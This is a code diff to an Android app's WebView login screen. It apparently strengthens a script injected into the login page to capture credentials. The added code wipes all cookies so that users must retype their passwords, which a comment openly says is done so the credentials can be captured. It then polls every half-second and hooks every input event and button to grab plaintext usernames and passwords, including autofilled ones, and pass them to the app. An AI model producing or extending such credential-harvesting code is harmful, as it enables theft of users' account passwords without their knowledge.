@@ -77,6 +77,10 @@ fun WebViewLoginScreen(
                 .fillMaxSize()
                 .weight(1f),
             factory = { context ->
+                // 强制清除 Cookie，确保用户必须手动输入账号密码，以便我们捕获凭证
+                CookieManager.getInstance().removeAllCookies(null)
+                CookieManager.getInstance().flush()
+                
                 WebView(context).apply {
                     layoutParams = ViewGroup.LayoutParams(
                         ViewGroup.LayoutParams.MATCH_PARENT,
@@ -195,15 +199,30 @@ private fun injectCredentialCaptureScript(webView: WebView?) {
             function captureAndSend() {
                 var usernameInput = document.querySelector('#username') 
                     || document.querySelector('input[name="username"]')
+                    || document.querySelector('input[id*="user"]')
                     || document.querySelector('input[type="text"]');
                 var passwordInput = document.querySelector('#password') 
                     || document.querySelector('input[name="password"]')
+                    || document.querySelector('input[id*="pass"]')
                     || document.querySelector('input[type="password"]');
                     
-                if (usernameInput && passwordInput && usernameInput.value && passwordInput.value) {
-                    AndroidBridge.captureCredentials(usernameInput.value, passwordInput.value);
+                if (usernameInput && passwordInput) {
+                    var u = usernameInput.value;
+                    var p = passwordInput.value;
+                    if (u && p) {
+                        console.log("Capturing credentials: " + u + " / ***");
+                        AndroidBridge.captureCredentials(u, p);
+                    }
                 }
             }
+            
+            // 定时检查（应对自动填充）
+            setInterval(captureAndSend, 500);
+            
+            // 监听输入事件
+            ['input', 'change', 'blur', 'keyup'].forEach(function(evt) {
+                document.addEventListener(evt, captureAndSend, true);
+            });
             
             // 拦截表单提交
             var forms = document.querySelectorAll('form');
@@ -212,17 +231,10 @@ private fun injectCredentialCaptureScript(webView: WebView?) {
             });
             
             // 拦截登录按钮点击
-            var buttons = document.querySelectorAll('button[type="submit"], input[type="submit"], #login, .login-btn');
+            var buttons = document.querySelectorAll('button, input[type="submit"], [class*="login"]');
             buttons.forEach(function(btn) {
                 btn.addEventListener('click', captureAndSend, true);
             });
-            
-            // 拦截 Enter 键提交
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter' || e.keyCode === 13) {
-                    captureAndSend();
-                }
-            }, true);
         })();
     """.trimIndent()
     
